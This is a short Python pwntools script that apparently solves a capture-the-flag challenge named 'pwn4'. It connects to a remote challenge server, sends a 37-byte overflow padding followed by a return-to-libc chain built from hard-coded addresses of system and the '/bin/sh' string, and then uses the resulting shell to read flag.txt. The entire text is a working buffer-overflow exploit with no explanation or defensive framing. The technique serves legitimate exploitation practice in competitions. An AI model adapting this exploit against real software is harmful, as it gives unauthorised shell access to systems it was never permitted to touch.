from pwn import *

#: Connect to challenge server
HOST = 'pwn.tamuctf.com'
PORT = 4324
p = remote(HOST,PORT)
# p = process('./pwn4')
print(p.recv())

#: Exploit code
offset = 'A' * 37
system = p32(0x080483f0) #: Address of system, gdb-peda$ x/ system
junk = p32(0xdeadbeef)
bin_sh = p32(0x0804a034) #: Address of /bin/sh, gdb-peda$ find /bin/sh
exploit = offset + system + junk + bin_sh

#: Send data
p.sendline(exploit)
print(p.recv())
p.sendline('cat flag.txt')
print(p.recv())